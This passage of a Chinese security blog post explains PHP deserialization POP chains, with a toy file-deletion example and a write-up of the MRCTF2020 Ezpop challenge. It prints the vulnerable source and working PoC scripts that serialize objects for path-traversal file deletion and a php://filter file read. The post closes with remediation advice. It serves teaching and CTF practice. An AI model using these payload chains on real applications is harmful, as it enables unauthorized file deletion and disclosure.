(file_exists($file))&#123;</span><br><span class="line"></span><br><span class="line">            @unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &#x27;I am a evil Delete function&#x27;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.首先声明了$cache_file变量</p>
<p>2.定义了Delete()函数，如果定义的$file变量中的文件存在，则删除此文件并返回提示内容</p>
<p><strong>Test3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Test3&#123;</span><br><span class="line"></span><br><span class="line">    function Delete()&#123;</span><br><span class="line"></span><br><span class="line">        return &#x27;I am a safe Delete function&#x27;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.定义了Delete()函数,此函数只返回一句话，没有敏感操作，为安全函数</p>
<p><strong>POP链构造：</strong></p>
<p>首先出发点是Test1中的__tostring()魔术方法，其中调用了$this-&gt;obj中的Delete()函数，而$this-&gt;obj是在实例化对象是触发__construct方法，将$this-&gt;obj作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下</p>
<p>Test1类→__construct()→$this-&gt;obj&#x3D;new Test3→__tostring()→Test3.Delete方法</p>
<p>不过在Test2类中也定义了和Test3中同名的函数Delete()，那么我们可以通过构造特定的反序列化参数来修改执行流，也就是构造我们的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作，让执行流如下</p>
<p>Test1类→__construct()→$this-&gt;obj&#x3D;new Test2→__tostring()→Test2.Delete方法</p>
<p>那么POP链的构造就是通过反序列化和echo来触发__tostring()魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。</p>
<p><strong>利用POC：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test1&#123;</span><br><span class="line">    protected $obj;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;obj = new Test2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test2&#123;</span><br><span class="line">    public $cache_file = &#x27;../../../../test.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$evil = new Test1();</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($evil));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="实例解析2："><a href="#实例解析2：" class="headerlink" title="实例解析2："></a>实例解析2：</h5><p><strong>[MRCTF2020]Ezpop</strong></p>
<p><strong>源码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码分析：</strong></p>
<p>首先还是看全部代码的入点，在最下面的一个判断，GET接收到pop参数则反序列化处理，否则实例化Show给$a，然后高亮当前文件</p>
<p>其次源码中有三个类，分别是Modifier，Show，Test，依次分析</p>
<p><strong>Modifier：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.首先声明了$var变量</p>
<p>2.定义了append($value)方法，操作是include($value)</p>
<p>3.定义了魔术方法__invoke()，操作是调用本类中的append方法传递参数为$this-&gt;var</p>
<p><strong>__invoke() 当尝试以调用函数的方式调用一个对象时触发</strong></p>
<p><strong>Show：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.声明了$source和$str变量</p>
<p>2.声明了魔术方法__construct($file&#x3D;’index.php’)，操作为给$this-&gt;source变量赋值为$file</p>
<p><strong>__construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值</strong></p>
<p>3.声明了魔术方法__toString()，操作为返回$this-&gt;str-&gt;source</p>
<p><strong>__toString() 当一个类被当成字符串使用时触发</strong></p>
<p>4.声明了魔术方法__wakeup()，操作为正则匹配$this-&gt;source变量，如果匹配到则赋值$this-&gt;source&#x3D;”index.php”</p>
<p><strong>__wakeup() 使用unserialize()时自动触发</strong></p>
<p><strong>Test：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.声明了$p变量</p>
<p>2.声明了魔术方法__construct()，操作为赋值$this-&gt;p&#x3D;array()</p>
<p>3.声明了魔术方法__get()，操作为赋值$function&#x3D;$this-&gt;p，然后以函数返回$funcion()</p>
<p><strong>__get() 用于从不可访问的属性读取数据</strong></p>
<p><strong>POP链构造：</strong></p>
<p>由于本题是一道CTF题目，我们的目标是获得flag，提示flag在flag.php里，通过对三个类的代码分析，可以读取到flag的地方只有append($value)方法，操作是include($value)，可以利用伪协议来读取flag.php内容。</p>
<p>由于这道题目只有include那里可以利用，那么我们从那里反推</p>
<p>一.要想利用include，需要使用__invoke()来触发，而这个魔术方法的触发条件是，以调用函数的方式调用一个对象，那么我们找哪里可以满足这个条件。</p>
<p>二.在对Test类代码分析的第三条中，__get()魔术方法以$funcion()函数返回$this-&gt;p，<strong>我们需要将$this-&gt;p设置为Modifier的实例化对象</strong>，那么而且上面对$this-&gt;p赋值的操作是__construct()控制，也就是说是我们可控的，那么就看如何利用__get()</p>
<p>三.要想利用Test类中的__get()魔术方法，也需要我们用一定的条件触发，从不可访问的属性读取数据时触发，那么符合的只有Show类中的__toString()，<strong>需要将$this-&gt;str设置为Test类的实例化对象</strong></p>
<p>四.触发__toString()的条件是：__toString() 当一个类被当成字符串使用时触发，那么在本类中的__wakeup()魔术方法中的preg<em>match就正好可以触发，也就是*<em>将$this-&gt;source设置为Show类的实例化对象，也就需要在*_construct()时就设置$file为Show的实例化对象</em></em></p>
<p>那么整体的pop链应该是如下的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Modifier::__invoke()&lt;--Test::__get()&lt;--Show::__toString()&lt;--Show::__wakeup()&lt;--Show::__construct()</span><br></pre></td></tr></table></figure>

<p><strong>利用POC：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27; ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Show();</span><br><span class="line">$a-&gt;str = new Test();</span><br><span class="line">$a-&gt;str-&gt;p = new Modifier();</span><br><span class="line">$b = new Show($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这道题目不是利用的同名函数来执行敏感操作，而是利用函数和对象之间的传递来调用敏感函数，形成了反序列化漏洞可以任意调用文件包含函数。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复PHP反序列化漏洞可以采取以下措施：</p>
<ol>
<li>检查并过滤用户输入：在反序列化之前，对用户输入进行严格的过滤和检查，只允许特定的类型和结构进行反序列化。可以使用白名单机制来限制反序列化的类和方法。</li>
<li>使用安全的反序列化函数：尽量使用安全的反序列化函数，如unserialize()函数。避免使用eval()等不安全的反序列化函数，因为这些函数可能执行任意的PHP代码。</li>
<li>序列化和反序列化的数据验证：在序列化和反序列化的过程中，对数据进行验证和完整性检查。可以对序列化数据添加签名或MAC（Message Authentication Code），以确保数据的完整性和身份验证。</li>
<li>使用对象的标识符而不是类名：在序列化和反序列化的过程中，使用对象的标识符而不是类名。这样可以避免攻击者通过构造恶意类名来执行代码。</li>
<li>更新PHP版本和相关组件：及时更新PHP版本和相关组件，以修复已知的反序列化漏洞。同时，保持系统和应用程序的安全补丁更新。</li>
<li>配置安全选项：在PHP配置文件中设置相关安全选项，如禁用危险函数、限制反序列化的深度和复杂度等。</li>
<li>使用安全的序列化和反序列化库：使用经过安全审计和验证的第三方序列化和反序列化库，确保其安全性和稳定性。</li>
<li>审查第三方代码和组件：审查和评估使用的第三方代码和组件，确保其安全性和可靠性。尽量选择经过安全审计和验证的组件，并及时更新和升级。</li>
</ol>
<p>修复Java反序列化漏洞可以采取以下措施：</p>
<ol>
<li><p>反序列化白名单：在反序列化操作之前，先进行输入验证，只接受预先定义好的类进行反序列化操作。可以使用许可清单（Whitelist）或黑名单（Blacklist）的方式限制可反序列化的类。</p>
</li>
<li><p>使用安全的序列化库：使用经过安全审计的序列化库，例如JSON、XML等，而不是使用Java的默认序列化机制。这些库通常会提供更多的控制和安全选项。</p>
</li>
<li><p>避免反序列化敏感数据：不要将敏感数据序列化到文件或网络中，而是在需要时进行加密&#x2F;解密处理。</p>
</li>
<li><p>更新JDK和第三方库：及时更新Java Development Kit（JDK）和第三方库，以获取最新的安全补丁和修复。</p>
</li>
<li><p>实施安全编码实践：遵循安全编码实践，如避免使用不受信任的数据进行反序列化，尽量减少反序列化的使用等。</p>
</li>
<li><p>额外的安全措施：可以考虑使用安全沙箱（Security Sandbox）等额外的安全措施，对反序列化操作进行进一步的隔离和控制。</p>
</li>
</ol>

    </div>

    
    
    

<div>
  
    
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>
  
</div>

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/11/15/XSS/" rel="prev" title="XSS漏洞">
                  <i class="fa fa-angle-left"></i> XSS漏洞
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/28/Domain-Environment/" rel="next" title="搭建域环境">
                  搭建域环境 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Xorb_7</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
